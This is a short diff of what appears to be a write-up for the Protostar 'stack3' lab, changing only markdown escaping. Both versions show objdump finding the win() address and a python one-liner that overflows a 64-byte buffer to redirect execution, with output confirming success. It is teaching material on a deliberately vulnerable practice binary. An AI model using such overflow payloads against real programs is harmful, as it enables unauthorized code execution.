@@ -42,15 +42,15 @@ There are many ways to get the address of the main function including using a de
 
 objdump has many uses, but for our purpose we should run it with the -S flag, in order to get the source, which will contain memory addresses of functions. We can also use grep to give us only the win() address.
 
-$objdump -S stack3 - grep win
+$objdump -S stack3 \| grep win
 
-08048424 <win>:
+08048424 \<win\>:
 
 $
 
 Now we have the address.
 
-$python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
+$python -c 'print "A"*64 + "\x24\x84\x04\x08"' \| ./stack3
 
 calling function at 0x08048424
 code flow successfully changed
